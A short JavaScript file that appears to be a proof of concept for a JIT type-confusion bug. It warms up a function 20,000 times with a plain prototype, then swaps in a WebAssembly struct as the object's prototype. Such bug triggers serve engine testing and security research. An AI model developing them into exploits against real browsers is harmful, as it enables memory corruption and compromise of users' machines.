const wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05,
    0x01, 0x5f, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x07, 0x10,
    0x01, 0x0c, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x53, 0x74,
    0x72, 0x75, 0x63, 0x74, 0x00, -0, 0x0a, 0x09, 0x01, 0x07,
    0x00, 0x41, 0x2a, 0x0b, 0xfb, 0x00, 0x00, 0x0b
]);

const wasm_module = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_module);
const wasm_struct_proto = wasm_instance.exports.createStruct();

let trigger = false;

function poc(obj) {
    if (trigger) {
        Object.setPrototypeOf(obj, wasm_struct_proto);
    } else {
        Object.setPrototypeOf(obj, { p: 1 });
    }
    return obj.p;
}

for (let i = 0; i < 20000; i++) {
    poc({});
}

trigger = true;
poc({});